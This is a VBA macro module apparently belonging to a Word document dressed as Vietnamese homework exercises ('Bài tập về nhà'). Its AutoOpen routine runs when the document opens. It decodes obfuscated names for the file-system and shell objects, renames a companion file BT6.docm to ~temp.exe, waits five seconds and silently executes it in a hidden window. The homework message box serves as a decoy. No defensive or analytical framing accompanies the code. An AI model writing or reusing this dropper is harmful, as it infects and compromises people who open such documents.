Sub AutoOpen()
    Dim fso As Object
    Dim sourcePath As String
    Dim targetPath As String
    Dim shell As Object
    
    ' String obfuscation for "Scripting.FileSystemObject"
    Dim fsoStr As String
    fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu")
    
    ' String obfuscation for "WScript.Shell"
    Dim shellStr As String
    shellStr = DecodeString("XTdsjqu/Tifmm")
    
    Set fso = CreateObject(fsoStr)
    Set shell = CreateObject(shellStr)
    sourcePath = ActiveDocument.Path & "\BT6.docm"
    targetPath = ActiveDocument.Path & "\~temp.exe" 
        
    If fso.FileExists(targetPath) Then
        fso.DeleteFile targetPath
    End If
    fso.MoveFile sourcePath, targetPath
    
    Dim startTime As Double
    startTime = Timer
    Do While Timer < startTime + 5
        DoEvents
    Loop
    shell.Run Chr(34) & targetPath & Chr(34), 0, False
    Set fso = Nothing
    Set shell = Nothing
End Sub

Function DecodeString(encoded As String) As String
    Dim result As String
    result = ""
    For i = 1 To Len(encoded)
        result = result & Chr(Asc(Mid(encoded, i, 1)) - 1)
    Next i
    DecodeString = result
End Function

Sub ShowInfo()
    Dim message As String
    Dim title As String
    
    message = "Bài tập số 1" & vbCrLf
    message = message & "Bài tập số 2" & vbCrLf
    message = message & "Bài tập số 3" & vbCrLf
    message = message & "Bài tập số 4" & vbCrLf
    title = "Bài tập về nhà"

    MsgBox message, vbInformation, title
End Sub